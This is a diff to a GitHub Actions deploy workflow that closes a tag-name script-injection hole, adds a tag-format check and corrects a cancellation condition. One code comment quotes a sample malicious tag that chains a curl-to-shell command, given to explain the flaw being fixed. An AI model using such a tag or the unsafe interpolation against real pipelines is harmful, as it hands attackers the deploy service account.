@@ -28,7 +28,16 @@ on:
 # Cloud Functions API returned 429 "Per project mutation requests" quota
 # exceeded, leaving prod one merge behind. One deploy at a time.
 # cancel-in-progress stays FALSE deliberately -- never kill a prod deploy
-# mid-flight, and never cancel a rollback because a new tag arrived.
+# mid-flight.
+#
+# KNOWN EDGE, kept on purpose: GitHub allows only one PENDING run per group and
+# cancels the older one, so if a release is in flight and two more queue, the
+# middle one is dropped -- reported as "cancelled", not "queued". That was
+# harmless when this workflow deployed the branch tip (a coalesced run shipped
+# the same code); it is NOT harmless now that each run carries a distinct tag,
+# and a dropped run could be a rollback. Serializing still beats the 429s, so
+# the mitigation is operational, not structural: check the run actually
+# deployed. Documented in docs/releasing.md.
 concurrency:
   group: firebase-deploy-prod
   cancel-in-progress: false
@@ -55,25 +64,43 @@ jobs:
 
       - id: resolve
         name: Resolve the tag and prove it is on main
+        env:
+          # NEVER interpolate a ref name into the shell source. `${{ }}` is
+          # expanded by the Actions expression engine BEFORE bash parses the
+          # script, so the value becomes code, not an argument. Git ref names
+          # forbid space, `~^:?*[\` and `..` but PERMIT ` $ ; " | & ( ) -- so
+          # `v1.0.0";curl$IFS-s$IFS<host>|sh;#` is a pushable tag matching the
+          # `v*` filter. Pushing a tag is the lowest-trust action that reaches
+          # this workflow, and this job holds `id-token: write` against a WIF
+          # provider that is not ref-scoped, so the sink is the deploy service
+          # account itself -- the gate's own bypass. Via `env:` the value
+          # arrives as data and the quoting below keeps it that way.
+          TAG: ${{ inputs.tag || github.ref_name }}
         run: |
           set -euo pipefail
-          REF="${{ inputs.tag || github.ref_name }}"
-          echo "ref=$REF" >> "$GITHUB_OUTPUT"
 
-          if ! git rev-parse -q --verify "refs/tags/$REF" >/dev/null; then
-            echo "::error::No such tag: $REF"
+          # Constrain the alphabet as well as the quoting: defence in depth, and
+          # it also rejects tags that simply aren't releases.
+          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9][A-Za-z0-9._-]*$'; then
+            echo "::error::Refusing to release from an unexpected tag name."
             exit 1
           fi
-          SHA="$(git rev-list -n 1 "refs/tags/$REF")"
+          echo "ref=$TAG" >> "$GITHUB_OUTPUT"
+
+          if ! git rev-parse -q --verify "refs/tags/$TAG" >/dev/null; then
+            echo "::error::No such tag: $TAG"
+            exit 1
+          fi
+          SHA="$(git rev-list -n 1 "refs/tags/$TAG")"
           echo "sha=$SHA" >> "$GITHUB_OUTPUT"
 
           git fetch --no-tags origin main
           if ! git merge-base --is-ancestor "$SHA" origin/main; then
-            echo "::error::Tag $REF ($SHA) is not an ancestor of origin/main."
+            echo "::error::Tag $TAG ($SHA) is not an ancestor of origin/main."
             echo "::error::Only commits that have landed on main may be released."
             exit 1
           fi
-          echo "Releasing $REF -> $SHA (verified on main)"
+          echo "Releasing $TAG -> $SHA (verified on main)"
 
   # Gate 2: the same Tests workflow main runs, re-run against the tagged tree.
   # The commit passed on main, but CI tests the MERGE ref, and a later merge can
@@ -97,8 +124,12 @@ jobs:
     # rollback a no-op that reports success. Require verify_tag to have passed
     # and verify_tests to have either passed or been deliberately skipped --
     # never to have failed.
+    # `!cancelled()`, not `always()`: always() is true even when the run has
+    # been cancelled, and on the rollback path verify_tests is skipped by
+    # design -- so once verify_tag had succeeded, cancelling the run would
+    # still let the production deploy proceed.
     if: >-
-      always()
+      !cancelled()
       && needs.verify_tag.result == 'success'
       && (needs.verify_tests.result == 'success' || needs.verify_tests.result == 'skipped')
     runs-on: ubuntu-latest
